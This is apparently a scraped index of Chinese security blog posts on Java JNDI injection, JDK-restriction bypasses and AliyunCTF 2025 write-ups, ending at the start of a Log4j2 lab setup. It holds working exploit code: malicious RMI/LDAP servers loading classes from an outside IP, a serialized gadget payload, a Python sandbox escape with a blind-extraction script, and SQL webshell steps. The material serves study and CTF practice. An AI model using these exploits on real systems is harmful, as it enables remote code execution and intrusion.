RMI 6u132 以下 7u122 以下 8u113 以下 无 ","date":"2025-02-27","objectID":"/posts/java-jndi/:7:0","tags":["java","JNDI"],"title":"Java JNDI 注入","uri":"/posts/java-jndi/"},{"categories":["javasec"],"content":"JNDI+RMI 在攻击RMI服务的时候我们提到过通过远程加载Codebase的方式来加载恶意的远程类到服务器上。和Codebase类似，我们也可以使用Reference类来从远程加载恶意类。JDK版本为 JDK8u_65，攻击代码如下 RMI_Server.java package org.example; import com.sun.jndi.rmi.registry.ReferenceWrapper; import javax.naming.Reference; import java.rmi.Naming; import java.rmi.registry.LocateRegistry; public class RMI_Server { void register() throws Exception{ LocateRegistry.createRegistry(1099); Reference reference = new Reference(\"RMI_POC\",\"RMI_POC\",\"http://106.53.212.184:6666/\"); ReferenceWrapper refObjWrapper = new ReferenceWrapper(reference); Naming.bind(\"hello\",refObjWrapper); System.out.println(\"START RUN\"); } public static void main(String[] args) throws Exception { new RMI_Server().register(); } }其中 RMIHello 为我们要远程访问的类，如下 RMI_POC import javax.naming.Context; import javax.naming.Name; import javax.naming.spi.ObjectFactory; import java.io.IOException; import java.rmi.RemoteException; import java.rmi.server.UnicastRemoteObject; import java.util.Hashtable; public class RMIHello extends UnicastRemoteObject implements ObjectFactory { public RMIHello() throws RemoteException { super(); try { Runtime.getRuntime().exec(\"calc\"); } catch (IOException e) { e.printStackTrace(); } } @Override public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable\u003c?, ?\u003e environment) throws Exception { return null; } }注意，RMIHello 类需要继承 ObjectFactory 类，并且构造函数需要为 public。 受害客户端如下，我们将 lookup() 参数控制位我们恶意 RMI 服务的地址 RMI_CN.java package org.example; import javax.naming.InitialContext; public class RMI_CN { public static void main(String[]args) throws Exception{ String string = \"rmi://localhost:1099/hello\"; InitialContext initialContext = new InitialContext(); initialContext.lookup(string); } }我们搭建好恶意的 RMI 服务器，并且在远端服务器上放置恶意类。客户端成功调用并初始化我们远端的恶意 启动服务 1、将 HTTP 端恶意载荷 RMI_POC.java，编译成 RMI_POC.class 文件，或者直接使用 idea 编译。 javac RMI_POC.java2、在 RMI_POC.class 目录下利用 Python 起一个临时的 WEB 服务放置恶意载荷,这里的端口必须要与 RMI_Server.java 的 Reference 里面的链接端口一致 启动服务端 启动客户端加载恶意类 看到成功弹出计算机。 关于这里 lookup 触发到底层的调用原理参考：https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/#RMI-%E5%8E%9F%E7%94%9F%E6%BC%8F%E6%B4%9E 这里调用到底层主要是通过 URLClassLoader 的动态类加载，但是其实这里也是存在反序列化漏洞的，因为底层调用了 RegistryContext.lookup() 方法，而这个 RegistryContext 类是 RMI 中，如果 RMI 存在反序列化，那么 JNDI 这里也会有，只是这不是真正意义上的 jndi 注入属于是 rmi 的反序列化漏洞了，一般情况下都是通过 URLClassLoader 来动态加载恶意类。 然后至于这个是怎么从 lookup 到达 URLClassLoader 动态加载类以及为什么要是 reference 对象和 factory 的作用建议还是看看上面这篇文章。 ","date":"2025-02-27","objectID":"/posts/java-jndi/:7:1","tags":["java","JNDI"],"title":"Java JNDI 注入","uri":"/posts/java-jndi/"},{"categories":["javasec"],"content":"JNDI+LDAP LDAP 既是一类服务，也是一种协议，LDAP 目录和 RMI 注册表的区别在于是前者是目录服务，并允许分配存储对象的属性。 LDAP Directory 作为一种目录服务，主要用于带有条件限制的对象查询和搜索。目录服务作为一种特殊的数据库，用来保存描述性的、基于属性的详细信息。和传统数据库相比，最大的不同在于目录服务中数据的组织方式，它是一种有层次的树形结构，因此它有优异的读性能，但写性能较差，并且没有事务处理、回滚等复杂功能，不适于存储修改频繁的数据。 LDAP 的请求和响应是 ASN.1 格式，使用二进制的 BER 编码，操作类型(Operation)包括 Bind/Unbind、Search、Modify、Add、Delete、Compare 等等，除了这些常规的增删改查操作，同时也包含一些拓展的操作类型和异步通知事件。 更加具体参考：java LDAP 我们可以使用 LDAP 服务来存储 Java 对象，如果我们此时能够控制 JNDI 去访问存储在 LDAP 中的 Java 恶意对象，那么就有可能达到攻击的目的。LDAP 能够存储的 Java 对象如下 Java 序列化 JNDI 的 References Marshalled 对象 Remote Location 首先下载 LDAP依赖。 \u003cdependency\u003e \u003cgroupId\u003ecom.unboundid\u003c/groupId\u003e \u003cartifactId\u003eunboundid-ldapsdk\u003c/artifactId\u003e \u003cversion\u003e3.1.1\u003c/version\u003e \u003cscope\u003etest\u003c/scope\u003e \u003c/dependency\u003eLDAP_Server.java package org.example; import com.unboundid.ldap.listener.InMemoryDirectoryServer; import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig; import com.unboundid.ldap.listener.InMemoryListenerConfig; import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult; import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor; import com.unboundid.ldap.sdk.Entry; import com.unboundid.ldap.sdk.LDAPException; import com.unboundid.ldap.sdk.LDAPResult; import com.unboundid.ldap.sdk.ResultCode; import javax.net.ServerSocketFactory; import javax.net.SocketFactory; import javax.net.ssl.SSLSocketFactory; import java.net.InetAddress; import java.net.MalformedURLException; import java.net.URL; public class LDAP_Server { private static final String LDAP_BASE = \"dc=gaoren,dc=com\"; public static void main ( String[] tmp_args ) { String[] args=new String[]{\"http://106.53.212.184:6666/#LDAP_POC\"}; int port = 9999; try { InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE); config.setListenerConfigs(new InMemoryListenerConfig( \"listen\", //$NON-NLS-1$ InetAddress.getByName(\"0.0.0.0\"), //$NON-NLS-1$ port, ServerSocketFactory.getDefault(), SocketFactory.getDefault(), (SSLSocketFactory) SSLSocketFactory.getDefault())); config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ]))); InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config); System.out.println(\"Listening on 0.0.0.0:\" + port); //$NON-NLS-1$ ds.startListening(); } catch ( Exception e ) { e.printStackTrace(); } } private static class OperationInterceptor extends InMemoryOperationInterceptor { private URL codebase; public OperationInterceptor ( URL cb ) { this.codebase = cb; } @Override public void processSearchResult ( InMemoryInterceptedSearchResult result ) { String base = result.getRequest().getBaseDN(); Entry e = new Entry(base); try { sendResult(result, base, e); } catch ( Exception e1 ) { e1.printStackTrace(); } } protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException { URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(\".class\")); System.out.println(\"Send LDAP reference result for \" + base + \" redirecting to \" + turl); e.addAttribute(\"javaClassName\", \"foo\"); String cbstring = this.codebase.toString(); int refPos = cbstring.indexOf('#'); if ( refPos \u003e 0 ) { cbstring = cbstring.substring(0, refPos); } e.addAttribute(\"javaCodeBase\", cbstring); e.addAttribute(\"objectClass\", \"javaNamingReference\"); //$NON-NLS-1$ e.addAttribute(\"javaFactory\", this.codebase.getRef()); result.sendSearchEntry(e); result.setResult(new LDAPResult(0, ResultCode.SUCCESS)); } } }LDAP_POC.java import javax.naming.Context; import javax.naming.Name; import javax.naming.spi.ObjectFactory; import java.io.IOException; import java.util.Hashtable; public class LDAP_POC implements ObjectFactory { public LDAP_POC() throws Exception{ try { Runtime.getRuntime().exec(\"calc\"); } catch (IOException e) { e.printStackTrace(); } } @Override public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable\u003c?, ?\u003e environment) throws Exception { return null; } }LDAP_CN.java package org.example","date":"2025-02-27","objectID":"/posts/java-jndi/:7:2","tags":["java","JNDI"],"title":"Java JNDI 注入","uri":"/posts/java-jndi/"},{"categories":["javasec"],"content":"JNDI+CORBA 一个简单的流程是：resolve_str 最终会调用到 StubFactoryFactoryStaticImpl.createStubFactory 去加载远程 class 并调用 newInstance 创建对象，其内部使用的 ClassLoader 是 RMIClassLoader，在反序列化 stub 的上下文中，默认不允许访问远程文件，因此这种方法在实际场景中比较少用。所以就不深入研究了。 ","date":"2025-02-27","objectID":"/posts/java-jndi/:7:3","tags":["java","JNDI"],"title":"Java JNDI 注入","uri":"/posts/java-jndi/"},{"categories":["javasec"],"content":"JDK 高版本限制 在我们利用Codebase攻击RMI服务的时候，如果想要根据Codebase加载位于远端服务器的类时，java.rmi.server.useCodebaseOnly 的值必须为 false。但是从 JDK 6u45、7u21 开始，java.rmi.server.useCodebaseOnly 的默认值就是 true。 ","date":"2025-02-27","objectID":"/posts/java-jndi/:8:0","tags":["java","JNDI"],"title":"Java JNDI 注入","uri":"/posts/java-jndi/"},{"categories":["javasec"],"content":"JNDI_RMI_Reference 限制 RMI 在 JDK 6u132, JDK 7u122, JDK 8u113 之后限制了远程加载 Reference 工厂类。com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为了 false，即默认不允许通过RMI从远程的 Codebase 加载 Reference 工厂类。 ","date":"2025-02-27","objectID":"/posts/java-jndi/:8:1","tags":["java","JNDI"],"title":"Java JNDI 注入","uri":"/posts/java-jndi/"},{"categories":["javasec"],"content":"JNDI_LDAP_Reference 限制 JNDI不仅可以从通过RMI加载远程的 Reference 工厂类，也可以通过 LDAP 协议加载远程的 Reference 工厂类，但是在之后的版本 Java 也对 LDAP Reference 远程加载 Factory 类进行了限制，在 JDK 11.0.1、8u191、7u201、6u211 之后 com.sun.jndi.ldap.object.trustURLCodebase 属性的默认值同样被修改为了 false，对应的CVE编号为：CVE-2018-3149。 ","date":"2025-02-27","objectID":"/posts/java-jndi/:8:2","tags":["java","JNDI"],"title":"Java JNDI 注入","uri":"/posts/java-jndi/"},{"categories":["javasec"],"content":"限制源码分析 JDK_8u65 在低版本JDK_8u65下，在 RegistryContext#decodeObject() 方法会直接调用到 NamingManager#getObjectInstance()，进而调用 getObjectFactoryFromReference() 方法来获取远程工厂类。 JDK_8u241 同样是在 RegistryContext#decodeObject() 方法，这里增加了对类型以及 trustURLCodebase 的检查，所以也就没法加载远程的 refrence 工厂类了。 ","date":"2025-02-27","objectID":"/posts/java-jndi/:8:3","tags":["java","JNDI"],"title":"Java JNDI 注入","uri":"/posts/java-jndi/"},{"categories":["javasec"],"content":"绕过高版本限制 ","date":"2025-02-27","objectID":"/posts/java-jndi/:9:0","tags":["java","JNDI"],"title":"Java JNDI 注入","uri":"/posts/java-jndi/"},{"categories":["javasec"],"content":"使用本地的 Reference Factory 类 8u191后已经默认不允许加载 codebase 中的远程类，但我们可以从本地加载合适 Reference Factory。上面看到是三个 if 条件那里，如果是本地类那么 rmiserver 一般是下面这种， 执行 ref.getFactoryClassLocation() 就为空了，就可以执行到 NamingManager.getObjectInstance 方法了。 该本地工厂类必须实现 javax.naming.spi.ObjectFactory 接口,因为在 NamingManager#getObjectFactoryFromReference 最后的 return 语句对 Factory 类的实例对象进行了强制类型转换将其转换为了 ObjectFactory 类型，并且该工厂类至少存在一个 getObjectInstance() 方法，下面接着看。 org.apache.naming.factory.BeanFactory 就是满足条件的类之一，并由于该类存在于 Tomcat8 依赖包中，攻击面和成功率还是比较高的。 构造服务端： import com.sun.jndi.rmi.registry.ReferenceWrapper; import org.apache.naming.ResourceRef; import javax.naming.StringRefAddr; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; public class JNDIBypassHighJava { public static void main(String[] args) throws Exception { System.out.println(\"[*]Evil RMI Server is Listening on port: 1099\"); Registry registry = LocateRegistry.createRegistry( 1099); ResourceRef resourceRef = new ResourceRef(\"javax.el.ELProcessor\",null,\"\",\"\", true,\"org.apache.naming.factory.BeanFactory\",null ); resourceRef.add(new StringRefAddr(\"forceString\", \"x=eval\")); resourceRef.add(new StringRefAddr(\"x\", \"\\\"\\\".getClass().forName(\\\"java.lang.Runtime\\\").getMethod(\\\"exec\\\",\\\"\\\".getClass()).invoke(\\\"\\\".getClass().forName(\\\"java.lang.Runtime\\\").getMethod(\\\"getRuntime\\\").invoke(null),\\\"calc.exe\\\")\")); ReferenceWrapper referenceWrapper = new ReferenceWrapper(resourceRef); registry.bind(\"Object\", referenceWrapper); } }或者 import com.sun.jndi.rmi.registry.ReferenceWrapper; import org.apache.naming.ResourceRef; import javax.naming.StringRefAddr; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; public class JNDIBypassHighJava { public static void main(String[] args) throws Exception { System.out.println(\"[*]Evil RMI Server is Listening on port: 1099\"); Registry registry = LocateRegistry.createRegistry( 1099); ResourceRef resourceRef = new ResourceRef(\"javax.el.ELProcessor\",null,\"\",\"\", true,\"org.apache.naming.factory.BeanFactory\",null ); resourceRef.add(new StringRefAddr(\"forceString\", \"x=eval\")); resourceRef.add(new StringRefAddr(\"x\", \"\\\"\\\".getClass().forName(\\\"javax.script.ScriptEngineManager\\\")\" + \".newInstance().getEngineByName(\\\"JavaScript\\\")\" + \".eval(\\\"new java.lang.ProcessBuilder['(java.lang.String[])'](['calc']).start()\\\")\")); ReferenceWrapper referenceWrapper = new ReferenceWrapper(resourceRef); registry.bind(\"Object\", referenceWrapper); } }客户端： import javax.naming.Context; import javax.naming.InitialContext; public class jndipass { public static void main(String[] args) throws Exception { String uri = \"rmi://localhost:1099/Object\"; Context context = new InitialContext(); context.lookup(uri); } }运行结果 具体绕过原理可以参考：https://drun1baby.top/2022/07/28/Java反序列化之JNDI学习/#0x03-绕过高版本-jdk-的攻击 这里就简单说一下过程，还是 lookup 一直到 RegistryContext 类，然后接着是 decodeObject() 方法的调用，在该方法中有继续调用 getObjectInstance 方法， 进入该方法，同样一路调用到 getObjectFactoryFromReference，由于是本地 factory 类，所以直接就能加载 看到这里 clas 不为空不会那么就不会进行远程加载了。并且看到最后强制类型转换为 ObjectFactory 类，这也是为什么要继承 javax.naming.spi.ObjectFactory 接口， 回到 getObjectInstance 方法继续看，接下来调用了 BeanFactory.getObjectInstance() 方法， 跟进，先判断 obj 是不是 ResourceRef 类实列 (这就是为什么我们在恶意 RMI 服务端中构造 Reference 类实例的时候必须要用 Reference 类的子类 ResourceRef 类来创建实例)，接着就是一大堆赋值的东西了， 先调用 tcl.loadClass(beanClassName); 让 beanClass 为 javax.el.ELProcessor 对象，实例化该类并获取其中的 forceString 类型的内容，也就是 x=eval 内容， 继续往下调试可以看到，查找 forceString 的内容中是否存在”=”号，不存在的话就调用属性的默认 setter 方法，存在的话就取键值、其中键是属性名而对应的值是其指定的 setter 方法。如此，之前设置的 forceString 的值就可以强制将 x 属性的 setter 方法转换为调用我们指定的 ELProcessor.eval() 方法了 接着是多个 do while 语句来遍历获取 ResourceRef 类实例 addr 属性的元素，当获取到 addrType 为 x 的元素时退出当前所有循环，然后调用 getContent() 方法来获取x属性对应的 contents 即恶意表达式。这里就是恶意 RMI 服务端中 ResourceRef 类实例添加的第二个元素，获取到类型为x对应的内容为恶意表达式后，从前面的缓存forced中取出key为x的值即javax.el.ELProcessor类的eval()方法并赋值给method变量，最后就是通过method.invoke()即反射调用的来执行 \"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['ca","date":"2025-02-27","objectID":"/posts/java-jndi/:9:1","tags":["java","JNDI"],"title":"Java JNDI 注入","uri":"/posts/java-jndi/"},{"categories":["javasec"],"content":"LDAP反序列化绕过 因为LDAP 还可以存储序列化的数据，那么如果LDAP存储的某个对象的 javaSerializedData 值不为空，则客户端会通过调用 obj.decodeObject() 对该属性值内容进行反序列化。如果客户端存在反序列化相关组件漏洞，则我们可以通过 LDAP 来传输恶意序列化对象。这也就是平常 JNDI 漏洞存在最多的形式，通过与其他链子结合和（具体过程分析参考：）。 恶意 LDAP 服务端，相较于原始的LDAP服务器，我们只需要略微改动即可，将被存储的类的属性值 javaSerializeData 更改为序列化 payload 即可（之前的 ldap 储存的属性为其他的） LDAP_BS.java package org.example; import com.unboundid.ldap.listener.InMemoryDirectoryServer; import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig; import com.unboundid.ldap.listener.InMemoryListenerConfig; import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult; import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor; import com.unboundid.ldap.sdk.Entry; import com.unboundid.ldap.sdk.LDAPResult; import com.unboundid.ldap.sdk.ResultCode; import javax.net.ServerSocketFactory; import javax.net.SocketFactory; import javax.net.ssl.SSLSocketFactory; import java.net.InetAddress; import java.net.URL; import java.util.Base64; public class LDAP_BS { private static final String LDAP_BASE = \"dc=example,dc=com\"; public static void main ( String[] tmp_args ) { String[] args=new String[]{\"http://127.0.0.1/#BS\"}; int port = 9999; try { InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE); config.setListenerConfigs(new InMemoryListenerConfig( \"listen\", //$NON-NLS-1$ InetAddress.getByName(\"0.0.0.0\"), //$NON-NLS-1$ port, ServerSocketFactory.getDefault(), SocketFactory.getDefault(), (SSLSocketFactory) SSLSocketFactory.getDefault())); config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[0]))); InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config); System.out.println(\"Listening on 0.0.0.0:\" + port); //$NON-NLS-1$ ds.startListening(); } catch ( Exception e ) { e.printStackTrace(); } } private static class OperationInterceptor extends InMemoryOperationInterceptor { private URL codebase; public OperationInterceptor ( URL cb ) { this.codebase = cb; } @Override public void processSearchResult ( InMemoryInterceptedSearchResult result ) { String base = result.getRequest().getBaseDN(); Entry e = new Entry(base); try { sendResult(result, base, e); } catch ( Exception e1 ) { e1.printStackTrace(); } } protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e) throws Exception { e.addAttribute(\"javaClassName\", \"foo\"); //getObject获取Gadget e.addAttribute(\"javaSerializedData\", Base64.getDecoder().decode( \"rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IANG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5rZXl2YWx1ZS5UaWVkTWFwRW50cnmKrdKbOcEf2wIAAkwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwdAADYWJjc3IAKm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5tYXAuTGF6eU1hcG7llIKeeRCUAwABTAAHZmFjdG9yeXQALExvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNoYWluZWRUcmFuc2Zvcm1lcjDHl+woepcEAgABWwANaVRyYW5zZm9ybWVyc3QALVtMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwdXIALVtMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLlRyYW5zZm9ybWVyO71WKvHYNBiZAgAAeHAAAAAEc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5Db25zdGFudFRyYW5zZm9ybWVyWHaQEUECsZQCAAFMAAlpQ29uc3RhbnRxAH4AA3hwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXB0AAlnZXRNZXRob2R1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+ABxzcQB+ABN1cQB+ABgAAAACcHB0AAZpbnZva2V1cQB+ABwAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAYc3EAfgATdXEAfgAYAAAAAXQABGNhbGN0AARleGVjdXEAfgAcAAAAAXEAfgAfc3EAfgAAP0AAAAAAAAx3CAAAABAAAAAAeHh0AANlZWV4\" )); result.sendSearchEntry(e); re","date":"2025-02-27","objectID":"/posts/java-jndi/:9:2","tags":["java","JNDI"],"title":"Java JNDI 注入","uri":"/posts/java-jndi/"},{"categories":["javasec"],"content":"总结 虽然这两种方式比较常用，但还是难免会遇到特殊情况。比如系统使用的是 Tomcat7（没有ELProcessor），或是没有 groovy 依赖，又或是没有本地可用的反序列化 gadget，还有可能连 Tomcat 都没有（无法使用 BeanFactory），一般这时候有些人可能就放弃了，这时可以参考一下这篇文章：JDK 高版本下 JNDI 注入深度剖析 参考：https://goodapple.top/archives/696 参考：https://xz.aliyun.com/t/15075 参考：https://xz.aliyun.com/t/12277 ","date":"2025-02-27","objectID":"/posts/java-jndi/:9:3","tags":["java","JNDI"],"title":"Java JNDI 注入","uri":"/posts/java-jndi/"},{"categories":["CTF"],"content":"ezoj 访问 /source 读取源码，大概就是会把 python 代码写到一个新的 py 文件然后进行执行，有个 hook 函数 import sys import math import collections import queue import heapq import bisect def audit_checker(event,args): if not event in [\"import\",\"time.sleep\",\"builtins.input\",\"builtins.input/result\"]: raise RuntimeError sys.addaudithook(audit_checker)绕过 addaudithook 可以参考这篇文章： https://dummykitty.github.io/python/2023/05/30/pyjail-bypass-07-%E7%BB%95%E8%BF%87-audit-hook.html 最后构造下面命令进行命令执行， import _posixsubprocess import os _posixsubprocess.fork_exec([b\"/bin/sh\",\"-c\", \"ls /\"], [b\"/bin/sh\"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False,False, None, None, None, -1, None, False)但是没有执行结果回显，因为给了 time.sleep 可以使用，本来想直接在这个 py 沙箱进行时间盲注的但是无法把结果赋值变量，所以重新写个文件 /tmp/1.py ，再在这个 py 文件进行盲注，构造脚本： import base64 import requests import time flag='' strings = \"qwertyuiopasdfghjklzxcvbnm1234567890{}-\" payload1=f\"\"\" import _posixsubprocess import os _posixsubprocess.fork_exec([b\"/bin/sh\",\"-c\", \"python3 /tmp/1.py\"], [b\"/bin/sh\"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False,False, None, None, None, -1, None, False) \"\"\" for i in range(1, 50): for j in strings: poc1=f\"\"\"import time import os if os.popen('whoami').read({i})[{i}-1] == \"{j}\": time.sleep(2)else: print(\"\") \"\"\" poc2=base64.b64encode(poc1.encode('utf-8')).decode() payload2 = f\"\"\" import _posixsubprocess import os _posixsubprocess.fork_exec([b\"/bin/sh\",\"-c\", \"echo '{poc2}'|base64 -d\u003e/tmp/1.py\"], [b\"/bin/sh\"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False,False, None, None, None, -1, None, False) \"\"\" resp1 = requests.post( \"http://172.29.230.100:8089/api/submit\", json={\"problem_id\": \"0\", \"code\": payload2}, ) start_time = time.time() resp2 = requests.post( \"http://172.29.230.100:8089/api/submit\", json={\"problem_id\": \"0\", \"code\": payload1}, ) end_time = time.time() # 记录请求结束时间 delay = end_time - start_time # 计算延迟时间 if delay \u003e 2: flag += j print(flag) break else: flag += \"\\n\" break本地效果， 最后盲注获得 flag。 ","date":"2025-02-25","objectID":"/posts/aliyunctf/:1:0","tags":["CTF"],"title":"AliyunCTF 2025 部分wp","uri":"/posts/aliyunctf/"},{"categories":["CTF"],"content":"打卡OK 开题就一个登录界面，不知道 code 是什么感觉爆破也是白爆破，进行目录扫描 访问 /index.php~ 发现可以查看 index.php 源码，尝试其他 php 文件名后加个~都可以读取源码，在 login.php 源码得到个数据库账户密码， 然后再在 ok.php 源码发现存在 adminer_481.php 路径 访问路径是个数据库管理服务， 连接后可以添加账户进行登录，但是登录后审半天也不知道想考个什么。 然后看到还能执行 sql 语句，尝试 sql 写马，但是在写马时报错了，显示权限不足， 最后发现还可以 root 账户进行登录，默认密码就为 root， 成功后访问/shell.php ","date":"2025-02-25","objectID":"/posts/aliyunctf/:2:0","tags":["CTF"],"title":"AliyunCTF 2025 部分wp","uri":"/posts/aliyunctf/"},{"categories":["javasec"],"content":"Apache_log4j2（CVE-2021-44228）漏洞复现 ","date":"2025-02-09","objectID":"/posts/log4j2/:0:0","tags":["java","漏洞复现"],"title":"Log4j2 漏洞复现","uri":"/posts/log4j2/"},{"categories":["javasec"],"content":"Log4j2 介绍 log4j2是apache下的java应用常见的开源日志库，是一个就Java的日志记录工具。在log4j框架的基础上进行了改进，并引入了丰富的特性，可以控制日志信息输送的目的地为控制台、文件、GUI组建等，被应用于业务系统开发，用于记录程序输入输出日志信息。 ","date":"2025-02-09","objectID":"/posts/log4j2/:1:0","tags":["java","漏洞复现"],"title":"Log4j2 漏洞复现","uri":"/posts/log4j2/"},{"categories":["javasec"],"content":"漏洞介绍 Apache Log4j2是一个基于Java的日志记录工具，当前被广泛应用于业务系统开发，开发者可以利用该工具将程序的输入输出信息进行日志记录。 2021年11月24日，阿里云安全团队向Apache官方报告了Apache Log4j2远程代码执行漏洞。该漏洞是由于Apache Log4j2某些功能存在递归解析功能，导致攻击者可直接构造恶意请求，触发远程代码执行漏洞，从而获得目标服务器权限。 在java中最常用的日志框架是log4j2和logback，其中log4j2支持lookup功能（查找搜索），这也是一个非常强大的功能，设计之初的目的也是为了方便开发者调用 例如当开发者想在日志中打印今天的日期，则只需要输出${data:MM-dd-yyyy}，此时log4j会将${}中包裹的内容单独处理，将它识别为日期查找，然后将该表达式替换为今天的日期内容输出为“08-22-2022”，这样做就不需要开发者自己去编写查找日期的代码。 表达式除了支持日期，还支持输出系统环境变量等功能，这样极大的方便了开发者。但是安全问题往往就是因为“图方便”引起的，毕竟设计者也是需要在安全性和用户体验之间做个平衡。 其实打印日期，打印系统变量这种对系统而言构不成什么威胁，最终要的原因是log4j还支持JNDI协议。 ","date":"2025-02-09","objectID":"/posts/log4j2/:2:0","tags":["java","漏洞复现"],"title":"Log4j2 漏洞复现","uri":"/posts/log4j2/"},{"categories":["javasec"],"content":"影响版本 2.0 \u003c= Apache log4j2 \u003c= 2.14.1 ","date":"2025-02-09","objectID":"/posts/log4j2/:3:0","tags":["java","漏洞复现"],"title":"Log4j2 漏洞复现","uri":"/posts/log4j2/"},{"categories":["javasec"],"content":"环境搭建 pom.xml \u003cdependencies\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.apache.logging.log4j\u003c/groupId\u003e \u003cartifactId\u003elog4j-core\u003c/artifactId\u003e \u003cversion\u003e2.14.1\u003c/version\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.apache.logging.log4j\u003c/groupId\u003e \u003cartifactId\u003elog4j-api\u003c/artifactId\u003e \u003cversion\u003e2.14.1\u003c/version\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003ejunit\u003c/groupId\u003e \u003cartifactId\u003ejunit\u003c/artifactId\u003e \u003cversion\u003e4.12\u003c/version\u003e \u003cscope\u003etest\u003c/scope\u003e \u003c/dependency\u003e \u003c/dependencies\u003elog4j2 的一些实现方式，什么 xml，yaml，properties 等很多方式。这里，我们简单用 xml 的方式来实现，文件如下，默认文件名为log4j2.xml， \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003c!-- log4j2 配置文件 --\u003e \u003c!-- 日志级别 trace\u003cdebug\u003cinfo\u003cwarn\u003cerror\u003cfatal --\u003e\u003cconfiguration status=\"info\"\u003e \u003c!-- 自定义属性 --\u003e \u003cProperties\u003e \u003c!-- 日志格式(控制台) --\u003e \u003cProperty name=\"pattern1\"\u003e[%-5p] %d %c - %m%n\u003c/Property\u003e \u003c!-- 日志格式(文件) --\u003e \u003cProperty name=\"pattern2\"\u003e =========================================%n 日志级别：%p%n 日志时间：%d%n 所属类名：%c%n 所属线程：%t%n 日志信息：%m%n \u003c/Property\u003e \u003c!-- 日志文件路径 --\u003e \u003cProperty name=\"filePath\"\u003elogs/myLog.log\u003c/Property\u003e \u003c/Properties\u003e \u003cappenders\u003e \u003cConsole name=\"Console\" target=\"SYSTEM_OUT\"\u003e \u003cPatternLayout pattern=\"${pattern1}\"/\u003e \u003c/Console\u003e \u003cRollingFile name=\"RollingFile\" fileName=\"${filePath}\" filePattern=\"logs/$${date:yyyy-MM}/app-%d{MM-dd-yyyy}-%i.log.gz\"\u003e \u003cPatternLayout pattern=\"${pattern2}\"/\u003e \u003cSizeBasedTriggeringPolicy size=\"5 MB\"/\u003e \u003c/RollingFile\u003e \u003c/appenders\u003e \u003cloggers\u003e \u003croot level=\"info\"\u003e \u003cappender-ref ref=\"Console\"/\u003e \u003cappender-ref ref=\"RollingFile\"/\u003e \u003c/root\u003e \u003c/loggers\u003e\u003c/configuration\u003e然后再写一个实际应用的 demo，比如从数据库获取到了一个 username 为 “admin”，要把它登录进来的信息打印到日志里面，这个路径一般有一个 /logs 的文件夹的。 package org.example; import org.apache.logging.log4j.LogManager; import org.apache.logging.log4j.Logger; import java.util.function.LongFunction; public class Main { public static void main(String[] args) { Logger logger = LogManager.getLogger(LongFunction.class); String username = \"${java:os}\"; if (username != null ) { logger.info(\"User {} login in!\", username); } else { logger.error(\"User {} not exists\", username); 